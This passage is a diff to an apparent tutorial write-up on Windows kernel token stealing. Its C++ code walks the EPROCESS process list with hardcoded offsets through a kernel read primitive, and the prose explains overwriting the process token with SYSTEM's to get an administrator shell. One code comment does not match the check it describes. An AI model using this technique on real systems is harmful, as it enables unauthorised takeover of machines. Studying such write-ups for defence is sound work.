@@ -291,5 +291,32 @@ This is to get the SYSTEM EPROC using PsInitialSystemProcess as we talked about 
 	uint64_t start = flink;
 	uint64_t myEproc = 0;
 ```
+From what we talked about earlier, the flink is at 0x448, and we are going to set a variable (myEproc) to zero as a standby variable to hold values we are going to need for the while loop.
+The while loop will cycle through the whole process list in an attempt to find our PID, then get it's base.
 
+Look at commnets in the code below :
+```cpp
+	while (1) {
+		uint64_t eproc = flink - 0x448; // setting eproc to base EPROCESS address
+		uint64_t pid = KernelRead(eproc + 0x440); // setting pid to eproc which is at base to 0x440 which is the UniqueProecessId
 
+		if((DWORD)pid == myPid){ // if the pid var above is equal to the on this one "DWORD myPid = GetCurrentProcessId();", set the address of that to the standby variable.
+			myEproc = eproc;
+			break;
+		}
+		flink = KernelRead(flink);
+		if (flink == start) {// Once the flink equals 0, print error.
+			printf("\n[-] Not found.");
+			return 1;
+		}
+
+	}
+	printf("[+] My eproc		: 0x%llX\n", myEproc);
+```
+
+Basically, we will get the current process ID (PID), then flink will be pointed to the Active Process Links table.
+After that, we will create loop to look for our cmd.exe process in memory so we can write the SYSTEM token to our process. If myPid (our pid) is equal to  the UPID (Unique), then, myEproc (cmd) will hold the base EPROCESS address.
+
+And then finally, we will use our KernelWrite function to overwrite the SYSTEM process token to our process TOKEN, leading to an interactive shell as administrator (NT Authority\System) :
+
+<img width="1083" height="573" alt="image" src="https://github.com/user-attachments/assets/229e8a4f-0b89-435a-8dfe-757e247e808f" />
